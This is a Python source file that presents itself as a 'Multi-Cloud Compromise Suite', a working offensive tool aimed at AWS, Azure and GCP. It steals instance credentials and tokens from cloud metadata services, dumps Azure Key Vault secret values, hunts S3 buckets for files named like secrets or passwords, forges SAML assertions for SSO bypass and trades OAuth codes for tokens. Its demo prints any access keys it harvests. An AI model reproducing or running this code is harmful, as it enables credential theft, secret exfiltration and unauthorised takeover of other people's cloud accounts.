#!/usr/bin/env python3
"""
Multi-Cloud Compromise Suite
AWS credential theft, Azure token/cert extraction, GCP service account abuse,
federated identity exploitation, cloud-native security bypass.
"""

import subprocess
import json
import boto3
import requests
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime
import base64
import re


class CloudProvider(Enum):
    """Cloud providers."""
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    KUBERNETES = "kubernetes"


@dataclass
class CloudCredential:
    """Cloud platform credential."""
    provider: CloudProvider
    credential_type: str  # access_key, token, cert, etc.
    username: str
    credential_value: str
    secret_value: Optional[str] = None
    metadata: Dict = field(default_factory=dict)
    source: str = ""
    timestamp: str = ""


@dataclass
class S3BucketInfo:
    """S3 bucket enumeration result."""
    bucket_name: str
    region: str
    is_public: bool
    access_control: str
    objects_count: int = 0
    interesting_files: List[str] = field(default_factory=list)
    permissions: Dict = field(default_factory=dict)


@dataclass
class AzureResourceInfo:
    """Azure resource discovered."""
    resource_type: str  # Storage, KeyVault, Database, etc.
    resource_name: str
    resource_group: str
    subscription_id: str
    is_public: bool = False
    connection_strings: List[str] = field(default_factory=list)


@dataclass
class IAMPolicy:
    """IAM policy discovered."""
    account_id: str
    principal: str  # User, Role, Service
    permissions: List[str]
    resources: List[str]
    is_overprivileged: bool = False


class AWSCompromise:
    """AWS credential theft and enumeration."""
    
    @staticmethod
    def steal_from_metadata_service(
        metadata_url: str = "http://169.254.169.254/latest/meta-data",
    ) -> Dict:
        """Extract credentials from EC2 metadata service."""
        credentials = {}
        
        try:
            # Get IAM security credentials path
            creds_url = f"{metadata_url}/iam/security-credentials/"
            response = requests.get(creds_url, timeout=2)
            
            if response.status_code == 200:
                role_name = response.text.strip()
                
                # Get actual credentials
                creds_url = f"{metadata_url}/iam/security-credentials/{role_name}"
                response = requests.get(creds_url, timeout=2)
                
                if response.status_code == 200:
                    creds_data = response.json()
                    credentials = {
                        "role_name": role_name,
                        "access_key": creds_data.get("AccessKeyId"),
                        "secret_key": creds_data.get("SecretAccessKey"),
                        "token": creds_data.get("Token"),
                        "expiration": creds_data.get("Expiration"),
                    }
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def enumerate_s3_buckets(aws_access_key: str, aws_secret_key: str) -> List[S3BucketInfo]:
        """Enumerate S3 buckets and check permissions."""
        buckets = []
        
        try:
            s3_client = boto3.client(
                's3',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
            )
            
            response = s3_client.list_buckets()
            
            for bucket in response.get('Buckets', []):
                bucket_name = bucket['Name']
                
                # Check if public
                try:
                    acl = s3_client.get_bucket_acl(Bucket=bucket_name)
                    is_public = any(
                        grant.get('Grantee', {}).get('Type') == 'Group' and
                        'AllUsers' in grant.get('Grantee', {}).get('URI', '')
                        for grant in acl.get('Grants', [])
                    )
                except Exception:
                    is_public = False
                
                # List objects
                try:
                    objects = s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=100)
                    obj_count = objects.get('KeyCount', 0)
                    
                    # Look for interesting files
                    interesting = []
                    for obj in objects.get('Contents', []):
                        key = obj['Key'].lower()
                        if any(x in key for x in ['secret', 'password', 'key', 'credential', 'config', '.env']):
                            interesting.append(obj['Key'])
                except Exception:
                    obj_count = 0
                    interesting = []
                
                bucket_info = S3BucketInfo(
                    bucket_name=bucket_name,
                    region="unknown",
                    is_public=is_public,
                    access_control="unknown",
                    objects_count=obj_count,
                    interesting_files=interesting,
                )
                buckets.append(bucket_info)
        except Exception:
            pass
        
        return buckets
    
    @staticmethod
    def enumerate_iam_policies(aws_access_key: str, aws_secret_key: str) -> List[IAMPolicy]:
        """Enumerate IAM users and their policies."""
        policies = []
        
        try:
            iam_client = boto3.client(
                'iam',
                aws_access_key_id=aws_access_key,
                aws_secret_access_key=aws_secret_key,
            )
            
            # List users
            response = iam_client.list_users()
            
            for user in response.get('Users', []):
                username = user['UserName']
                
                # Get inline policies
                inline = iam_client.list_user_policies(UserName=username)
                
                for policy_name in inline.get('PolicyNames', []):
                    policy_doc = iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
                    policy_doc = policy_doc['PolicyDocument']
                    
                    # Extract permissions
                    for statement in policy_doc.get('Statement', []):
                        actions = statement.get('Action', [])
                        if isinstance(actions, str):
                            actions = [actions]
                        
                        resources = statement.get('Resource', [])
                        if isinstance(resources, str):
                            resources = [resources]
                        
                        # Check if overprivileged
                        is_overprivileged = '*' in actions or '*' in resources
                        
                        policy = IAMPolicy(
                            account_id="unknown",
                            principal=username,
                            permissions=actions,
                            resources=resources,
                            is_overprivileged=is_overprivileged,
                        )
                        policies.append(policy)
        except Exception:
            pass
        
        return policies
    
    @staticmethod
    def steal_from_instance_user_data() -> Optional[str]:
        """Extract user data from EC2 instance."""
        try:
            response = requests.get(
                "http://169.254.169.254/latest/user-data",
                timeout=2
            )
            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None


class AzureCompromise:
    """Azure credential and resource theft."""
    
    @staticmethod
    def steal_from_managed_identity(
        metadata_url: str = "http://169.254.169.254/metadata/identity/oauth2/token",
    ) -> Optional[str]:
        """Extract Azure Managed Identity token."""
        try:
            params = {
                "api-version": "2017-09-01",
                "resource": "https://management.azure.com/",
            }
            headers = {"Metadata": "true"}
            
            response = requests.get(metadata_url, params=params, headers=headers, timeout=2)
            
            if response.status_code == 200:
                token_data = response.json()
                return token_data.get('access_token')
            return None
        except Exception:
            return None
    
    @staticmethod
    def enumerate_blob_containers(
        storage_account: str,
        storage_key: str,
    ) -> List[Dict]:
        """Enumerate Azure Blob containers."""
        containers = []
        
        try:
            from azure.storage.blob import BlobServiceClient
            
            connection_string = (
                f"DefaultEndpointsProtocol=https;"
                f"AccountName={storage_account};"
                f"AccountKey={storage_key};"
                f"EndpointSuffix=core.windows.net"
            )
            
            client = BlobServiceClient.from_connection_string(connection_string)
            
            for container in client.list_containers():
                container_info = {
                    "name": container['name'],
                    "public_access": container.get('public_access'),
                    "blobs": [],
                }
                
                # List blobs in container
                container_client = client.get_container_client(container['name'])
                for blob in container_client.list_blobs():
                    container_info['blobs'].append(blob['name'])
                
                containers.append(container_info)
        except Exception:
            pass
        
        return containers
    
    @staticmethod
    def extract_keyvault_secrets(
        vault_name: str,
        token: str,
    ) -> List[Dict]:
        """Extract secrets from Azure Key Vault."""
        secrets = []
        
        try:
            url = f"https://{vault_name}.vault.azure.net/secrets?api-version=7.3"
            headers = {"Authorization": f"Bearer {token}"}
            
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                
                for secret in data.get('value', []):
                    secret_name = secret['id'].split('/')[-1]
                    
                    # Retrieve secret value
                    secret_url = f"{secret['id']}?api-version=7.3"
                    secret_response = requests.get(secret_url, headers=headers)
                    
                    if secret_response.status_code == 200:
                        secret_data = secret_response.json()
                        secrets.append({
                            "name": secret_name,
                            "value": secret_data.get('value'),
                        })
        except Exception:
            pass
        
        return secrets


class GCPCompromise:
    """GCP service account and resource compromise."""
    
    @staticmethod
    def steal_from_metadata_service(
        metadata_url: str = "http://metadata.google.internal/computeMetadata/v1",
    ) -> Optional[str]:
        """Extract GCP service account token."""
        try:
            headers = {"Metadata-Flavor": "Google"}
            
            # Get default service account token
            token_url = f"{metadata_url}/instance/service-accounts/default/identity?audience=https://www.googleapis.com"
            response = requests.get(token_url, headers=headers, timeout=2)
            
            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None
    
    @staticmethod
    def enumerate_gcs_buckets(
        project_id: str,
        token: str,
    ) -> List[Dict]:
        """Enumerate GCS buckets accessible to service account."""
        buckets = []
        
        try:
            from google.cloud import storage
            from google.auth.transport.requests import Request
            from google.oauth2.service_account import Credentials
            
            # Would need to instantiate with token
            # Simplified stub
            url = f"https://www.googleapis.com/storage/v1/b?project={project_id}"
            headers = {"Authorization": f"Bearer {token}"}
            
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                for bucket in data.get('items', []):
                    buckets.append({
                        "name": bucket['name'],
                        "location": bucket.get('location'),
                        "storage_class": bucket.get('storageClass'),
                    })
        except Exception:
            pass
        
        return buckets
    
    @staticmethod
    def steal_service_account_key(
        private_key_id: str,
        private_key: str,
        client_email: str,
        project_id: str,
    ) -> Dict:
        """Extract service account key for long-term access."""
        return {
            "type": "service_account",
            "project_id": project_id,
            "private_key_id": private_key_id,
            "private_key": private_key,
            "client_email": client_email,
            "client_id": "unknown",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
        }


class FederatedIdentityExploit:
    """Exploit federated identity (SAML, OAuth)."""
    
    @staticmethod
    def forge_saml_assertion(
        issuer: str,
        subject: str,
        audience: str,
        private_key: str,
        claims: Dict = None,
    ) -> str:
        """Forge SAML assertion for SSO bypass."""
        if claims is None:
            claims = {}
        
        # Simplified SAML construction
        from datetime import datetime, timedelta
        import uuid
        
        assertion_id = f"_{uuid.uuid4()}"
        issued_at = datetime.utcnow()
        not_on_or_after = issued_at + timedelta(minutes=5)
        
        saml_response = f"""
<samlp:Response ID="{assertion_id}" Version="2.0" IssueInstant="{issued_at.isoformat()}Z">
  <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issued_at.isoformat()}Z">
    <saml:Issuer>{issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{subject}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after.isoformat()}Z" Recipient="{audience}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{issued_at.isoformat()}Z" NotOnOrAfter="{not_on_or_after.isoformat()}Z">
      <saml:AudienceRestriction>
        <saml:Audience>{audience}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{issued_at.isoformat()}Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml:AttributeValue>{claims.get('email', subject)}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
        """
        
        return base64.b64encode(saml_response.encode()).decode()
    
    @staticmethod
    def oauth_token_theft(
        authorization_code: str,
        client_id: str,
        client_secret: str,
        token_endpoint: str,
        redirect_uri: str,
    ) -> Optional[str]:
        """Exchange authorization code for access token."""
        try:
            data = {
                "grant_type": "authorization_code",
                "code": authorization_code,
                "redirect_uri": redirect_uri,
                "client_id": client_id,
                "client_secret": client_secret,
            }
            
            response = requests.post(token_endpoint, data=data)
            
            if response.status_code == 200:
                token_data = response.json()
                return token_data.get('access_token')
            return None
        except Exception:
            return None


class CloudCompromiseOrchestrator:
    """Main orchestrator for cloud compromise."""
    
    def __init__(self):
        self.credentials: List[CloudCredential] = []
        self.resources: List[Dict] = []
    
    def compromise_aws(self, aws_access_key: str, aws_secret_key: str) -> Dict:
        """Full AWS compromise."""
        results = {
            "s3_buckets": AWSCompromise.enumerate_s3_buckets(aws_access_key, aws_secret_key),
            "iam_policies": AWSCompromise.enumerate_iam_policies(aws_access_key, aws_secret_key),
        }
        
        return results
    
    def compromise_azure(self, token: str, vault_name: str) -> Dict:
        """Full Azure compromise."""
        results = {
            "keyvault_secrets": AzureCompromise.extract_keyvault_secrets(vault_name, token),
        }
        
        return results
    
    def compromise_gcp(self, project_id: str, token: str) -> Dict:
        """Full GCP compromise."""
        results = {
            "gcs_buckets": GCPCompromise.enumerate_gcs_buckets(project_id, token),
        }
        
        return results
    
    def export_json(self) -> str:
        """Export all discovered credentials and resources."""
        return json.dumps({
            "credentials": [asdict(c) for c in self.credentials],
            "resources": self.resources,
        }, indent=2, default=str)


def main():
    """Demo: cloud compromise."""
    
    # Detect if running on EC2
    try:
        creds = AWSCompromise.steal_from_metadata_service()
        if creds.get('access_key'):
            print(f"[+] AWS Credentials found!")
            print(f"    Access Key: {creds['access_key']}")
            print(f"    Expires: {creds['expiration']}")
    except Exception:
        print("[-] Not running on EC2 or metadata service not available")
    
    # Detect if running on Azure
    try:
        token = AzureCompromise.steal_from_managed_identity()
        if token:
            print(f"[+] Azure Managed Identity token found!")
    except Exception:
        print("[-] Not running on Azure or managed identity not available")
    
    # Detect if running on GCP
    try:
        token = GCPCompromise.steal_from_metadata_service()
        if token:
            print(f"[+] GCP service account token found!")
    except Exception:
        print("[-] Not running on GCP or metadata service not available")


if __name__ == '__main__':
    main()
